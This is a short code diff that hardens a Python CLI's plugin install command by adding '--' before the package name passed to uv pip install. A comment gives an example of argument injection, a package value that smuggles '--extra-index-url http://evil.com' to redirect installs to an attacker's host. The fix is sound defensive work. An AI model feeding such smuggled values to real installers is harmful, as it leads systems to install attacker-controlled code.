@@ -297,7 +297,8 @@ def plugin_install_command(
 
     typer.echo(f"Installing {package}...")
     installed_before = get_installed_plugin_names_fn()
-    install_cmd = ["uv", "pip", "install", "--python", sys.executable, package]
+    # Use '--' to prevent argument injection vulnerabilities (e.g. package="--extra-index-url http://evil.com ...")
+    install_cmd = ["uv", "pip", "install", "--python", sys.executable, "--", package]
 
     try:
         result = subprocess.run(
